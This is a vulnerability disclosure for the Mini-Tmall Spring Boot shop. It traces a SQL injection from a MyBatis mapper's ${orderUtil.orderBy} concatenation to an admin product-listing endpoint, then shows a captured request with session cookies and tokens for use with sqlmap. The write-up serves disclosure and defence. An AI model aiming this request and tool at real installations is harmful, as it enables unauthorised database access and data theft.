
# Description of the vulnerability
Mini-Tmall is a mini Tmall mall based on Spring Boot, which can be quickly deployed and run, and is suitable as a template for completion.
# System situation
## version
2025/02/11 latest
## Project address
https://gitee.com/project_team/Tmall_demo

# analyse
1.The global search found that ${orderUtil. orderBy} is used as a connection parameter in mybatis/mapper/ProductMapper.xml:88.  So, if we can control the parameters, it's going to cause SQL injection.
![image](https://github.com/user-attachments/assets/581457c9-24ee-4fa5-9173-f67fd9544d8b)
2.Find the select() method declaration in com/xq/tmall/dao/ProductMapper.java:16.  You can control orderUtil. orderBy by passing an argument to orderUtil.  Let's go ahead and find where the select() method is called.
![image](https://github.com/user-attachments/assets/c95fcd22-88cb-4572-8fc8-aacfb5a02680)
3.You can see the call to ProductMapper.select() found in com/xq/tmall/service/impl/ProductServiceImpl.java:38. Let's go up and see where getList() is called.
![image](https://github.com/user-attachments/assets/962e6733-9107-4dfd-b14a-188c0f4fb2fb)
4.It is obvious that we went directly to the controller layer and found that getList() was called in com/xq/tmall/controller/admin/ProductController.java:405.  So, as long as we can pass the corresponding parameters over HTTP, we can trigger the SQL injection vulnerability.
![image](https://github.com/user-attachments/assets/98e90853-9626-4c8a-b2a3-7354bf08442e)
5.The orderby parameter is obtained from line 372 through the http request.  In the next 399 lines give the OrderUtil class.  You can go further and look at the class's constructor.
![image](https://github.com/user-attachments/assets/bef826b9-f372-4907-91b8-c3d59b483470)
![image](https://github.com/user-attachments/assets/afe33563-9e9c-408a-8642-eb17909ab381)



# verify
sqlmap test results

r.txt:
```
GET /tmall/admin/product/1/10?product_name=&category_id=&product_sale_price=&product_price=&product_isEnabled_array=&orderBy=&isDesc=true HTTP/1.1
Host: 127.0.0.1:8887
sec-ch-ua-platform: "Windows"
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Accept: */*
sec-ch-ua: "Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"
sec-ch-ua-mobile: ?0
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:8887/tmall/admin
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-GB;q=0.8,en-US;q=0.7,en;q=0.6
Cookie: username=admin; username=admin; JSESSIONID=48E23263092CD1BD89C0C150458330CF; XXL_JOB_LOGIN_IDENTITY=7b226964223a312c22757365726e616d65223a2261646d696e222c2270617373776f7264223a223864646366663361383066343138396361316339643464393032633363393039222c22726f6c65223a312c227065726d697373696f6e223a6e756c6c7d; remember-me=YWRtaW46MTc0MDYyNTU3NDc3MDpmMWI5MWRhMWVmMjU5MzgwMGY0ZDk4NzIwZjNhNjIxMQ
Connection: close
```
sqlmap -r r.txt
![image](https://github.com/user-attachments/assets/9e08967c-9ac7-464e-b41c-6d43e678cc09)

